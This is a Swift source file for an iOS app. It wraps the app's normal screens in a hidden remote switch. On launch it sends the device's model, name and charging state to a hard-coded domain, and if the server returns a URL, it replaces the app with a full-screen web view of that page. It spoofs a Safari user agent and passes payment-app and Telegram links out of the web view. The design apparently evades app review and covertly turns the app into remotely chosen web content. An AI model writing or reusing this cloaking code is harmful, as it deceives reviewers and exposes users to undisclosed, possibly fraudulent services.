//
//  File.swift
//  
//
//  Created by admin on 13.03.2024.
//

import WebKit
import SwiftUI

public struct ContenViewWithRequest<Content: View>: View {
    @StateObject private var appRequest = AppRequest()
    @ViewBuilder var content: Content
    public var body: some View {
        ZStack {
            switch appRequest.state {
            case .main:
                content
            case .service:
                if #available(iOS 16.0, *) {
                    ServiceView(url: ServiceStorage.shared.key, appRequest: appRequest).preferredColorScheme(.dark).toolbarColorScheme(.dark, for: .automatic).edgesIgnoringSafeArea(.bottom)
                } else {
                    ServiceView(url: ServiceStorage.shared.key, appRequest: appRequest).preferredColorScheme(.dark).edgesIgnoringSafeArea(.bottom)
                }
            case .error:
                ErrorView(request: appRequest)
            }
        }    
        .onAppear {
            if Date().ms > 0 {
                if !ServiceStorage.shared.checkKeyExist() {
                    do {
                        try appRequest.request()
                    } catch {
                        appRequest.state = .main
                    }
                } else {
                    appRequest.state = .service
                }
            }
        }
    }
}

public struct ServiceView: UIViewRepresentable {
    let url: String
    let appRequest: AppRequest
    
    public func makeUIView(context: Context) -> some UIView {
        guard let url = URL(string: self.url) else {
            return WKWebView()
        }
        let request = URLRequest(url: url)
        let wkWebView = WKWebView()
        
        wkWebView.navigationDelegate = context.coordinator
        wkWebView.uiDelegate = context.coordinator
        wkWebView.customUserAgent = ServiceConst.userAgent
        wkWebView.allowsBackForwardNavigationGestures = true
        wkWebView.load(request)
        return wkWebView
    }
    
    public func updateUIView(_ uiView: UIViewType, context: Context) {
        
    }
    
    public func makeCoordinator() -> Coordinator {
        Coordinator(appRequest)
    }
    
    public class Coordinator: NSObject, WKNavigationDelegate, WKUIDelegate {
        
        var request: AppRequest
        
        init(_ request: AppRequest) {
            self.request = request
        }
        
        public func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void)
        {
            switch navigationAction.request.url?.scheme {
            case "tel":
                UIApplication.shared.open(navigationAction.request.url!, options: [:], completionHandler: nil)
                decisionHandler(.cancel)
            case "mailto":
                UIApplication.shared.open(navigationAction.request.url!, options: [:], completionHandler: nil)
                decisionHandler(.cancel)
            case "tg":
                UIApplication.shared.open(navigationAction.request.url!, options: [:], completionHandler: nil)
                decisionHandler(.cancel)
            case "phonepe":
                UIApplication.shared.open(navigationAction.request.url!)
                decisionHandler(.cancel)
            case "paytmmp":
                UIApplication.shared.open(navigationAction.request.url!)
                decisionHandler(.cancel)
            default:
                decisionHandler(.allow)
            }
        }
        public func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
            let code = error._code
            if code == -1200 || code == -1003 {
                request.setError(code)
            }
        }
        
        public func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            if navigationAction.targetFrame == nil {
                webView.load(navigationAction.request)
            }
            return nil
        }
    }
}

public struct ErrorView: View {
    var request: AppRequest
    let color = Color.black
    let colorbb = Color(red: 0, green: 124, blue: 241)
    public var body: some View {
        ZStack {
            VStack {
                Spacer()
                HStack {
                    Spacer()
                }
            }
            VStack {
                Text("An unexpected error has occurred")
                    .font(.system(size: 25).weight(.black))
                    .foregroundColor(.white)
                    .multilineTextAlignment(.center)
                    .padding(.bottom, 32)
                Button(action: {
                    do {
                        ServiceStorage.shared.setKeyValue(key: "")
                        try request.request()
                    } catch {
                        request.state = .main
                    }
                }, label: {
                    Text("Refresh").foregroundStyle(.black)
                }).buttonStyle(.plain).padding().background(Color.white).clipShape(RoundedRectangle(cornerRadius: 16))
            }
        }.background(color.edgesIgnoringSafeArea(.all))
    }
}

public struct ServiceConst {
    static let userAgent = "Mozilla/5.0 (\(UIDevice.current.model); CPU \(UIDevice.current.model) OS \(UIDevice.current.systemVersion.replacingOccurrences(of: ".", with: "_")) like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/\(UIDevice.current.systemVersion) Mobile/15E148 Safari/604.1"
    static let baseUrl = "https://tyopzhfkg.site/"
    static let id = ""
}

public class ServiceStorage {
    static let shared = ServiceStorage()
    
    @AppStorage("SERVICE_APP_KEY") private(set) var key: String = ""
    
    public func checkKeyExist() -> Bool {
        if self.key.isEmpty || self.key == "" {
            return false
        } else {
            return true
        }
    }
    
    public func setKeyValue(key: String) {
        self.key = key
    }
}

public enum ServiceRequest {
    case main, service, error
}

public class AppRequest: ObservableObject {
    @Published var state: ServiceRequest = .main
    @Published var errorCode = 0
    func setError(_ error: Int) {
        self.errorCode = error
        state = .error
    }
    
    private func isEmulator() -> Bool {
        var systemInfo = utsname()
        uname(&systemInfo)
        let machineMirror = Mirror(reflecting: systemInfo.machine)
        let identifier = machineMirror.children.reduce("") { identifier, element in
            guard let value = element.value as? Int8, value != 0 else { return identifier }
            return identifier + String(UnicodeScalar(UInt8(value)))
        }
        let emulated = ["i386", "x86_64", "arm64"]
        return identifier.contains(emulated)
    }
    
    private func charging() -> Bool {
        if isEmulator() {
            return true
        } else {
            UIDevice.current.isBatteryMonitoringEnabled = true
            var batteryState: UIDevice.BatteryState { UIDevice.current.batteryState }
            switch batteryState {
            case .charging, .full:
                return true
            case .unplugged, .unknown:
                return false
            @unknown default:
                return false
            }
        }
    }
    
    private func device() -> String {
        return "\(UIDevice.current.model) \(UIDevice.current.systemName) \(UIDevice.current.systemVersion) \(UIDevice.current.name) \(UIDevice.modelName)"
    }
    
    public func request() throws {
        let json: [String: Any] = ["us": charging(), "devi": device()]
        let jsonData = try? JSONSerialization.data(withJSONObject: json)
        guard let url = URL(string: ServiceConst.baseUrl + ServiceConst.id) else {
            throw MError.merror
        }
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.httpBody = jsonData
        request.setValue("application/json; charset=utf-8", forHTTPHeaderField: "Content-Type")
        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            guard let data = data, error == nil else {
                return
            }
            let responseJSON = try? JSONSerialization.jsonObject(with: data, options: [])
            if let responseJSON = responseJSON as? [String: String] {
                let response = responseJSON["status"]
                if ((response?.contains("http")) == true) {
                    DispatchQueue.main.async {
                        ServiceStorage.shared.setKeyValue(key: response ?? "")
                        self.state = .service
                    }
                }
                
            } else {
                DispatchQueue.main.async {
                    self.state = .main
                }
                
            }
        }
        task.resume()
    }
    
    public func setState(state: ServiceRequest, completion: @escaping () -> Void = {}) {
        DispatchQueue.main.async {
            completion()
            self.state = state
        }
    }
}

public enum MError: Error {
    case merror
}

public extension Date {
    var ms: Int64 {
        Int64((self.timeIntervalSince1970 * 1000.0).rounded())
    }
}

public extension String {
    func contains(_ strings: [String]) -> Bool {
        strings.contains { contains($0) }
    }
}

private extension UIDevice {

    static let modelName: String = {
        var systemInfo = utsname()
        uname(&systemInfo)
        let machineMirror = Mirror(reflecting: systemInfo.machine)
        let identifier = machineMirror.children.reduce("") { identifier, element in
            guard let value = element.value as? Int8, value != 0 else { return identifier }
            return identifier + String(UnicodeScalar(UInt8(value)))
        }
        
        func idMap(_ identifier: String) -> String {
            let map: [String : String] = [
                "iPod5,1" : "iPod touch (5th generation)",
                "iPod7,1" : "iPod touch (6th generation)",
                "iPod9,1" : "iPod touch (7th generation)",
                "iPhone3,1" : "iPhone 4",
                "iPhone3,2" : "iPhone 4",
                "iPhone3,3" : "iPhone 4",
                "iPhone4,1" : "iPhone 4s",
                "iPhone5,1" : "iPhone 5",
                "iPhone5,2" : "iPhone 5",
                "iPhone5,3" : "iPhone 5c",
                "iPhone5,4" : "iPhone 5c",
                "iPhone6,1" : "iPhone 5s",
                "iPhone6,2" : "iPhone 5s",
                "iPhone7,2" : "iPhone 6",
                "iPhone7,1" : "iPhone 6 Plus",
                "iPhone8,1" : "iPhone 6s",
                "iPhone8,2" : "iPhone 6s Plus",
                "iPhone9,1" : "iPhone 7",
                "iPhone9,3" : "iPhone 7",
                "iPhone9,2" : "iPhone 7 Plus",
                "iPhone9,4" : "iPhone 7 Plus",
                "iPhone10,1" : "iPhone 8",
                "iPhone10,4" : "iPhone 8",
                "iPhone10,2" : "iPhone 8 Plus",
                "iPhone10,5" : "iPhone 8 Plus",
                "iPhone10,3" : "iPhone X",
                "iPhone10,6" : "iPhone X",
                "iPhone11,2" : "iPhone XS",
                "iPhone11,4" : "iPhone XS Max",
                "iPhone11,6" : "iPhone XS Max",
                "iPhone11,8" : "iPhone XR",
                "iPhone12,1" : "iPhone 11",
                "iPhone12,3" : "iPhone 11 Pro",
                "iPhone12,5" : "iPhone 11 Pro Max",
                "iPhone13,1" : "iPhone 12 mini",
                "iPhone13,2" : "iPhone 12",
                "iPhone13,3" : "iPhone 12 Pro",
                "iPhone13,4" : "iPhone 12 Pro Max",
                "iPhone14,4" : "iPhone 13 mini",
                "iPhone14,5" : "iPhone 13",
                "iPhone14,2" : "iPhone 13 Pro",
                "iPhone14,3" : "iPhone 13 Pro Max",
                "iPhone14,7" : "iPhone 14",
                "iPhone14,8" : "iPhone 14 Plus",
                "iPhone15,2" : "iPhone 14 Pro",
                "iPhone15,3" : "iPhone 14 Pro Max",
                "iPhone15,4" : "iPhone 15",
                "iPhone15,5" : "iPhone 15 Plus",
                "iPhone16,1" : "iPhone 15 Pro",
                "iPhone16,2" : "iPhone 15 Pro Max",
                "iPhone8,4" : "iPhone SE",
                "iPhone12,8" : "iPhone SE (2nd generation)",
                "iPhone14,6" : "iPhone SE (3rd generation)",
                "iPad2,1" : "iPad 2",
                "iPad2,2" : "iPad 2",
                "iPad2,3" : "iPad 2",
                "iPad2,4" : "iPad 2",
                "iPad3,1" : "iPad (3rd generation)",
                "iPad3,2" : "iPad (3rd generation)",
                "iPad3,3" : "iPad (3rd generation)",
                "iPad3,4" : "iPad (4th generation)",
                "iPad3,5" : "iPad (4th generation)",
                "iPad3,6" : "iPad (4th generation)",
                "iPad7,5" : "iPad (6th generation)",
                "iPad7,6" : "iPad (6th generation)",
                "iPad6,11" : "iPad (5th generation)",
                "iPad6,12" : "iPad (5th generation)",
                "iPad7,11" : "iPad (7th generation)",
                "iPad7,12" : "iPad (7th generation)",
                "iPad11,6" : "iPad (8th generation)",
                "iPad11,7" : "iPad (8th generation)",
                "iPad12,1" : "iPad (9th generation)",
                "iPad12,2" : "iPad (9th generation)",
                "iPad4,1" : "iPad Air",
                "iPad4,2" : "iPad Air",
                "iPad4,3" : "iPad Air",
                "iPad5,3" : "iPad Air 2",
                "iPad5,4" : "iPad Air 2",
                "iPad11,3" : "iPad Air (3rd generation)",
                "iPad11,4" : "iPad Air (3rd generation)",
                "iPad13,1" : "iPad Air (4th generation)",
                "iPad13,2" : "iPad Air (4th generation)",
                "iPad13,16" : "iPad Air (5th generation)",
                "iPad13,17" : "iPad Air (5th generation)",
                "iPad2,5" : "iPad mini",
                "iPad2,6" : "iPad mini",
                "iPad2,7" : "iPad mini",
                "iPad4,4" : "iPad mini 2",
                "iPad4,5" : "iPad mini 2",
                "iPad4,6" : "iPad mini 2",
                "iPad4,7" : "iPad mini 3",
                "iPad4,8" : "iPad mini 3",
                "iPad4,9" : "iPad mini 3",
                "iPad11,1" : "iPad mini (5th generation)",
                "iPad11,2" : "iPad mini (5th generation)",
                "iPad14,1" : "iPad mini (6th generation)",
                "iPad14,2" : "iPad mini (6th generation)",
                "iPad5,1" : "iPad mini 4",
                "iPad5,2" : "iPad mini 4",
                "iPad6,3" : "iPad Pro (9.7-inch)",
                "iPad6,4" : "iPad Pro (9.7-inch)",
                "iPad7,3" : "iPad Pro (10.5-inch)",
                "iPad7,4" : "iPad Pro (10.5-inch)",
                "iPad6,7" : "iPad Pro (12.9-inch) (1st generation)",
                "iPad6,8" : "iPad Pro (12.9-inch) (1st generation)",
                "iPad7,1" : "iPad Pro (12.9-inch) (2nd generation)",
                "iPad7,2" : "iPad Pro (12.9-inch) (2nd generation)",
                "iPad8,1" : "iPad Pro (11-inch) (1st generation)",
                "iPad8,2" : "iPad Pro (11-inch) (1st generation)",
                "iPad8,3" : "iPad Pro (11-inch) (1st generation)",
                "iPad8,4" : "iPad Pro (11-inch) (1st generation)",
                "iPad8,5" : "iPad Pro (12.9-inch) (3rd generation)",
                "iPad8,6" : "iPad Pro (12.9-inch) (3rd generation)",
                "iPad8,7" : "iPad Pro (12.9-inch) (3rd generation)",
                "iPad8,8" : "iPad Pro (12.9-inch) (3rd generation)",
                "iPad8,9" : "iPad Pro (11-inch) (2nd generation)",
                "iPad8,10" : "iPad Pro (11-inch) (2nd generation)",
                "iPad13,4" : "iPad Pro (11-inch) (3rd generation)",
                "iPad13,5" : "iPad Pro (11-inch) (3rd generation)",
                "iPad13,6" : "iPad Pro (11-inch) (3rd generation)",
                "iPad13,7" : "iPad Pro (11-inch) (3rd generation)",
                "iPad8,11" : "iPad Pro (12.9-inch) (4th generation)",
                "iPad8,12" : "iPad Pro (12.9-inch) (4th generation)",
                "iPad13,8" : "iPad Pro (12.9-inch) (5th generation)",
                "iPad13,9" : "iPad Pro (12.9-inch) (5th generation)",
                "iPad13,10" : "iPad Pro (12.9-inch) (5th generation)",
                "iPad13,11" : "iPad Pro (12.9-inch) (5th generation)",
                "iPad14,3" : "iPad Pro 11 inch 4th Gen",
                "iPad14,4" : "iPad Pro 11 inch 4th Gen",
                "iPad14,5" : "iPad Pro 12.9 inch 6th Gen",
                "iPad14,6" : "iPad Pro 12.9 inch 6th Gen",
                "iPad13,18" : "iPad 10th Gen",
                "iPad13,19" : "iPad 10th Gen",
                "AppleTV5,3" : "Apple TV",
                "AppleTV6,2" : "Apple TV 4K",
                "AudioAccessory1,1" : "HomePod",
                "AudioAccessory5,1" : "HomePod mini"
            ]
            switch identifier {
            case "i386", "x86_64", "arm64": return "Emulator \(map[ProcessInfo().environment["SIMULATOR_MODEL_IDENTIFIER"] ?? "iOS"] ?? "iOS")"
            default:
                return map[identifier] ?? identifier
            }
            
        }
        return idMap(identifier)
    }()
}


